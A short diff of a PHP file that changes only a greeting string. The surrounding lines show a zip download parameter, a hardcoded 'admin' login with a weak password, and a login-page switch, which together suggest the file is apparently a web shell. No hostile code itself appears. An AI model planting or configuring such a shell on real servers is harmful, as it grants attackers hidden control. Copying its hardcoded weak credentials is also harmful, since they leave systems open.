@@ -77,7 +77,7 @@ if(isset($_GET['zip'])) {
 
 /**************** Defines *********************************/
 
-$greeting 		= "0x xx W3lc0m3 M4st3r xx x0";
+$greeting 		= "0x xx Welcome Young Warrior xx x0";
 $user 			= "admin";
 $pass 			= "12345687";
 $lock 			= "on"; // set this to off if you dont need the login page
